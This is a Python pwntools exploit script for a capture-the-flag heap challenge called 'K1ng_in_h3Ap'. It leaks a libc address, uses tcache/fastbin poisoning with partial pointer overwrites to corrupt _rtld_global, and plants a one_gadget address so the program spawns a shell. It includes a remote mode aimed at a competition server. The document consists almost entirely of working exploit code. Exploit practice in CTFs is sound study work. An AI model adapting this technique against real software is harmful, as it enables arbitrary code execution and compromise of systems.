# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './K1ng_in_h3Ap'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-arm', binary,'-g','1234'])
    #p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '47.104.175.110'
    port = '20066'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(idx , size):
    cmd(1)
    sla('index',idx)
    sla('size:',size)

def delete(idx):
    cmd(2)
    sla('index' , idx)

def edit(idx , context):
    cmd(3)
    sla('index' , idx)
    sla('context' , context)

def p24(addr):
    return p16(addr & 0xffff) + p8((addr>>16) & 0xff)

one_gad = one_gadget(libc.path)

# 可以尝试打__exit_hook

cmd(666)
ru('0x')
leak = rint(6)
low_base = leak - (0xFFFFFF & libc.sym['printf'])
_rtld_global = 6225984 + 3840 + low_base - 0x30
ogg = one_gad[3] + low_base

add( 0,0x18 )
add( 1,0x40 )
add( 2,0x60 )
add( 3,0x20 )
add( 4,0x20 )

lg('ogg',ogg)
lg('low_base',low_base)
lg('_rtld_global',_rtld_global)

# dbg()

delete(3)
delete(4)

edit( 0 , flat(0 , 0x31))
edit( 4 , '\x10')
add( 5 , 0x20)
add( 5 , 0x20)
edit(5 , flat( 0 , 0x50+0x71))

delete(2)
delete(1)
add( 6 , 0x40)


add( 7,0xf0)
add( 8,0xf0)
delete(7)

edit(7 , p64(0) + p24(_rtld_global))
add( 7 , 0xf0)

fake_chunk = _rtld_global + 13

edit(2 , p24(fake_chunk))


add(0,0x68)
add(0,0x68)

edit(0,'\x00'*0x13 + p64(0) + p24(ogg))

delete(20)



p.interactive()

'''
@File    :   K1ng_in_h3Ap.py
@Time    :   2021/09/19 11:22:02
@Author  :   Niyah 
'''
